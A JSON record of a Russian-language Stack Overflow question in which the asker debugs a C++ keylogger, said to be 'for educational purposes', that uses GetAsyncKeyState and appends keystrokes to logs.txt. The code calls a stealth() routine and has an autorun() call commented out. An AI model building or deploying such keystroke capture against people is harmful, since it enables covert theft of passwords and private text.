{"tags":["c++","winapi"],"owner":{"reputation":13,"user_id":332316,"user_type":"registered","profile_image":"https://i.stack.imgur.com/EbloG.jpg?s=128&g=1","display_name":"Hellios","link":"https://ru.stackoverflow.com/users/332316/hellios"},"is_answered":true,"view_count":167,"accepted_answer_id":963930,"answer_count":1,"score":1,"last_activity_date":1554090169,"creation_date":1554068200,"question_id":963904,"link":"https://ru.stackoverflow.com/questions/963904/virtual-key-codes-%d0%b2-%d1%84%d0%b0%d0%b9%d0%bb-%d0%bd%d0%b5-%d0%b7%d0%b0%d0%bf%d0%b8%d1%81%d1%8b%d0%b2%d0%b0%d1%8e%d1%82%d1%81%d1%8f-%d0%bd%d0%b5%d1%81%d0%ba%d0%be%d0%bb%d1%8c%d0%ba%d0%be-%d0%ba%d0%bb%d0%b0%d0%b2%d0%b8%d1%88","title":"Virtual-key codes, в файл не записываются несколько клавиш","body":"<p>Пишу кейлоггер (в познавательных целях). Использую GetAsyncKeyState и коды клавиш. Пока использую английскую раскладку. Все клавиши записываются нормально, кроме тех, которые на скрине. Т.е. после запуска проги и жмакания по ним в текстовик ничего не записывается, но с остальными клавишами таких проблем нет. Собсна, почему так происходит? Коды не соответствуют?(проверял много раз)</p>\n\n<pre><code>#include \"pch.h\"\n#include &lt;iostream&gt;\n#include &lt;windows.h&gt;\n#include &lt;fstream&gt;\n#include &lt;string&gt;\n\n\nusing namespace std;\n\nbool is_capslock = false;\nint BackSp = 0;\n\nint save(int key)\n{\n    ofstream out_file;\n    out_file.open(\"logs.txt\", ios_base::app);\n    string Logs = \"\";\n\n\n    switch (key)\n    {\n    case 189:\n        BackSp = 0;\n        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {\n            Logs += \"_\";\n        }\n        else\n            Logs += \"-\";\n        break;\n    case 187:\n        BackSp = 0;\n        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {\n            Logs += \"+\";\n        }\n        else\n            Logs += \"=\";\n        break;\n    case 219:\n        BackSp = 0;\n        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {\n            Logs += \"{\";\n        }\n        else\n            Logs += \"[\";\n        break;\n    case 221:\n        BackSp = 0;\n        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {\n            Logs += \"}\";\n        }\n        else\n            Logs += \"]\";\n        break;\n    case 186:\n        BackSp = 0;\n        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {\n            Logs += \":\";\n        }\n        else\n            Logs += \";\";\n        break;\n    case 222:\n        BackSp = 0;\n        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {\n            Logs += \"\\\"\";\n        }\n        else\n            Logs += \"'\";\n        break;\n    case 220:\n        BackSp = 0;\n        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {\n            Logs += \"|\";\n        }\n        else\n            Logs += \"\\\\\";\n        break;\n    case 188:\n        BackSp = 0;\n        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {\n            Logs += \"&lt;\";\n        }\n        else\n            Logs += \",\";\n        break;\n    case 190:\n        BackSp = 0;\n        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {\n            Logs += \"&gt;\";\n        }\n        else\n            Logs += \".\";\n        break;\n    case 191:\n        BackSp = 0;\n        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {\n            Logs += \"?\";\n        }\n        else\n            Logs += \"/\";\n        break;\n    default:\n        break;\n    }\n\n    out_file &lt;&lt; Logs;\n    out_file.close();\n    return 0;\n}\n\nint main(int argc, char * argv[])\n{\n    //autorun();\n    stealth();\n\n    char buffer[MAX_PATH];\n    GetModuleFileNameA(NULL, buffer, MAX_PATH);\n\n    char i;\n    while (1)\n    {\n        for (i = 8; i &lt;= 190; i++)\n        {\n            if (GetAsyncKeyState(i) == -32767)\n                save(i);\n        }\n    }\n    return(0);\n}\n</code></pre>\n\n<p><a href=\"https://i.stack.imgur.com/sX0ny.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/sX0ny.png\" alt=\"скрин\"></a></p>\n"}